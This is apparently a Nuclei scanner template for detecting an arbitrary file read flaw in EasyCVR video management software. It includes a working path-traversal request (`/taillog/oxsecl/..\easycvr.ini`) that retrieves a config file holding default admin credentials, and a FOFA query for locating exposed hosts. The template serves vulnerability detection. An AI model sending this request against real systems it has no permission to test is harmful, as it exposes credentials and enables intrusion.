id: easycvr-arbitrary-file-read

info:
  name: EasyCVR Video Management - 任意文件读取漏洞
  author: s4e-io
  severity: high
  description: |
    该模板用于检测 EasyCVR Video Management - 任意文件读取漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/`、`/taillog/oxsecl/..\easycvr.ini` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkyNDY3MTY3MA==&mid=2247486259&idx=1&sn=dd51ca8df3aa1533144b975b9bec3086
  metadata:
    verified: true
    max-request: 2
    fofa-query: icon_hash="458134656"
  tags: easycvr,unauth,lfi,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "<title>EasyCVR")'
          - "status_code == 200"
        condition: and
        internal: true

  - raw:
      - |
        GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "default_admin_user", "default_admin_password")'
          - 'contains(content_type, "text/plain")'
          - "status_code == 200"
        condition: and
